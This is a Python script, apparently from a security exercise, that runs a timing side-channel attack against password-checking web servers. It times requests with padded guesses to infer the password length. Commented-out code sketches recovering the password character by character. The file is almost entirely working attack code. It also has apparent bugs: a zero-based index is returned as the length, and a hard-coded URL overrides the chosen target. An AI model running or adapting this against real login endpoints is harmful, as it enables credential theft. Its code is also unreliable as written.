import time
import requests
import numpy as np
# from HuckIt import find_pass_len, find_tav


def timeit(url2check, repeat=1):
    tt = []
    for _ in range(repeat):
        start = time.time()
        requests.get(url2check, allow_redirects=True)
        end = time.time()
        tt.append(end - start)
    return tt


def find_pass_len(url, MAX_LEN):
    time_values = []
    for num in range(1, MAX_LEN+1, 1):
        executed_url = url + '/' + ("").ljust(num, '*')# defining the password to sent
        time_values.append(min(timeit(executed_url, 5)))# add the time it took to the current password
        print(f'checking length: {num} the time it took: {time_values[-1]}')
    standart_devitation = np.std(time_values)# getting the standart_devitation from the list
    average = np.mean(time_values)# getting the average from the list
    for curr_time in time_values:# running over the times to checks if there is one which unusual
        if curr_time - average > 1.5 * standart_devitation:
            return time_values.index(curr_time)

if __name__ == '__main__':
    GAL_SITE = True

    if GAL_SITE:
        url = r'https://verifyserver.herokuapp.com/index'
        POOL = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        # POOL_SHORT = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

    else:
        url = "https://passwordserver.herokuapp.com/"

        POOL = '0123456789'

    pswd_len = find_pass_len("https://passwordserver.herokuapp.com/", 10)
    print(pswd_len)
    # temp_pswd = ""
    # for i in range(pswd_len):
    #     temp_pswd += find_tav(pswd_len, temp_pswd)
    # print("the password is : " + temp_pswd)